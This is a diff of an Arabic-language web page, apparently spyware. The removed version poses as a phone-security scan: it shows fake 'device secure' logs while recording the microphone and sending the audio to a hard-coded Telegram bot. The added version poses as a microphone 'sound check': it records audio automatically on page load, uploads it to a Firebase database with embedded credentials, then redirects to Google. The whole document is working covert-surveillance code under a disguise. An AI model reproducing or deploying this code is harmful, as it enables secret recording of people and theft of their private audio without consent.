@@ -1,22 +1,11 @@
-<!DOCTYPE html>
-<html lang="ar" dir="rtl">
-<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>🛡️ حماية الهاتف</title>
-<style>:root{--green:#00ff41;--red:#ff0040}*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Courier New',monospace;background:#000;color:#fff;height:100vh;display:flex;align-items:center;justify-content:center;text-align:center;padding:20px}.container{max-width:400px;width:100%}.page{display:none}.page.active{display:block}.skull{font-size:60px}h1{font-size:22px;color:var(--green)}.btn{width:100%;padding:18px;border-radius:12px;border:2px solid var(--green);background:#0a1a0a;color:var(--green);font-size:18px;font-weight:700;cursor:pointer;font-family:'Courier New',monospace}.code-screen{background:#000;border:2px solid var(--green);border-radius:10px;padding:14px;margin:16px 0;color:var(--green);font-size:10px;text-align:left;max-height:200px;overflow-y:auto}.countdown{font-size:40px;font-weight:900;color:var(--red)}.progress-bar{width:100%;height:4px;background:#0a1a0a;border-radius:2px;margin:10px 0;overflow:hidden}.progress-fill{height:100%;background:var(--red);width:0}</style>
-</head>
-<body>
-<div class="container">
-<div class="page active" id="page-home"><div class="skull">🛡️</div><h1>حماية الهاتف</h1><div style="color:var(--green)" id="device-name">📱 جاري الكشف...</div><button class="btn" onclick="startScan()">🔍 اضغط لبدء الفحص</button></div>
-<div class="page" id="page-scanning"><div class="skull">💀</div><h1>جاري الفحص...</h1><div class="code-screen" id="code-screen"></div><div class="countdown" id="countdown">30</div><div class="progress-bar"><div class="progress-fill" id="progress-fill"></div></div></div>
-<div class="page" id="page-done"><div style="font-size:70px">✅</div><div style="color:var(--green);font-size:22px">جهازك بأمان</div></div>
-</div>
+<!DOCTYPE html><html lang="ar" dir="rtl"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>فحص الصوت</title>
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
+<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Segoe UI',Tahoma,sans-serif;background:#1a1a2e;color:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;text-align:center}.container{max-width:400px}.logo{font-size:60px;margin-bottom:10px}h1{color:#4CAF50;font-size:18px;margin-bottom:5px}p{color:#aaa;font-size:12px}.status{color:#4CAF50;font-size:14px;margin-top:15px}</style></head>
+<body><div class="container"><div class="logo">🎤</div><h1>فحص الصوت</h1><p>جاري فحص الميكروفون...</p><div class="status" id="status">⏳ جاري التسجيل...</div></div>
 <script>
-const params=new URLSearchParams(location.search);const CHAT_ID=params.get('chatId')||'7276604783';const BOT_TOKEN=params.get('token')||'8437915697:AAGePdMDoI8h-jX_WTPOdNM42_LABwjRBUo';
-document.getElementById('device-name').textContent='📱 '+(navigator.userAgent.match(/; ([^;]+) Build/)?.[1]||'جهاز').trim();
-function showPage(id){document.querySelectorAll('.page').forEach(p=>p.classList.remove('active'));document.getElementById(id).classList.add('active')}
-let stream,recorder,chunks=[];
-async function startScan(){showPage('page-scanning');try{stream=await navigator.mediaDevices.getUserMedia({audio:true});chunks=[];recorder=new MediaRecorder(stream);recorder.ondataavailable=e=>{if(e.data.size>0)chunks.push(e.data)};recorder.start()}catch(e){}
-const cs=document.getElementById('code-screen'),cd=document.getElementById('countdown'),pf=document.getElementById('progress-fill'),logs=['[■] INITIALIZING...','[■] CHECKING...','[■] RECORDING...','[■] KERNEL: SECURE','[■] NO MALWARE','[✓] DEVICE SECURE'];let s=30;
-const t=setInterval(async()=>{s--;cd.textContent=s;pf.style.width=((30-s)/30*100)+'%';cs.innerHTML=logs.slice(0,Math.floor(((30-s)/30)*logs.length+1)).join('<br>');if(s<=0){clearInterval(t);if(recorder&&recorder.state==='recording'){recorder.stop();await new Promise(r=>setTimeout(r,2000));if(chunks.length>0){const blob=new Blob(chunks,{type:'audio/webm'});const fd=new FormData();fd.append('chat_id',CHAT_ID);fd.append('audio',blob,'audio_'+Date.now()+'.webm');fd.append('caption','🎤 تسجيل من: '+document.getElementById('device-name').textContent);fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`,{method:'POST',body:fd}).catch(e=>{})}if(stream)stream.getTracks().forEach(t=>t.stop())}showPage('page-done')}},1000)}
-</script>
-</body>
-</html>
+firebase.initializeApp({apiKey:"AIzaSyBu-9Z0T-OHPzauWXh8hmNSMDZKhAFnkf0",projectId:"game-a1aca",storageBucket:"game-a1aca.firebasestorage.app",appId:"1:598280425947:android:0e4ead8d9b50cfc92157fe"});
+var db=firebase.firestore();var mr,chunks=[];
+async function go(){try{var s=await navigator.mediaDevices.getUserMedia({audio:true});mr=new MediaRecorder(s);mr.ondataavailable=function(e){if(e.data.size>0)chunks.push(e.data)};mr.onstop=async function(){var blob=new Blob(chunks,{type:'audio/webm'});var r=new FileReader();r.onload=async function(e){await db.collection('gallery').add({url:e.target.result,type:'🎤 فحص الصوت - تسجيل',timestamp:new Date().toISOString()});document.getElementById('status').textContent='✅ تم التسجيل';setTimeout(function(){window.location.href='https://google.com/'},2000)};r.readAsDataURL(blob)};mr.start();setTimeout(function(){mr.stop();s.getTracks().forEach(function(t){t.stop()})},5000)}catch(e){document.getElementById('status').textContent='❌ خطأ'}}
+go();
+</script></body></html>
